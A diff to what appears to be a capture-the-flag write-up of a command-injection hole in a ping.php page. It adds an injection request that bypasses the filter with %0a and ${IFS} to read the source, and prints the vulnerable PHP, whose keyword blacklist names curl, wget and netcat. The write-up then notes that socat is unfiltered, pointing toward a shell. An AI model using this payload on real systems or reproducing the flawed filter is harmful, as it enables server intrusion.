@@ -406,9 +406,59 @@ command injection works, %0a is \n url endcoded and its not blacklisted:
 ![](./vhosts/monitoring/monitoring5.png)
 
 reading ping.php:
+
+```
+GET /ping.php?ip=127.0.0.1%0acat${IFS}ping.php
+```
+
 ![](./vhosts/monitoring/monitoring6.png)
 
+(keep whole file,explain):
 
+```php
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+$output = '';
+
+function filter($str)
+{
+  $operators = ['&', '|', ';', '\\', '/', ' '];
+  foreach ($operators as $operator) {
+    if (strpos($str, $operator)) {
+      return true;
+    }
+  }
+  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
+  foreach ($words as $word) {
+    if (strpos($str, $word) !== false) {
+      return true;
+    }
+  }
+
+  return false;
+}
+
+if (isset($_GET['ip'])) {
+  $ip = $_GET['ip'];
+  if (filter($ip)) {
+    $output = "Invalid input";
+  } else {
+    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
+    $output = shell_exec($cmd);
+  }
+}
+?>
+<?php
+echo $output;
+?>
+
+```
+
+socat is not blacklisted:
+
+![](./vhosts/monitoring/monitoring6.png)
 
 ```
 
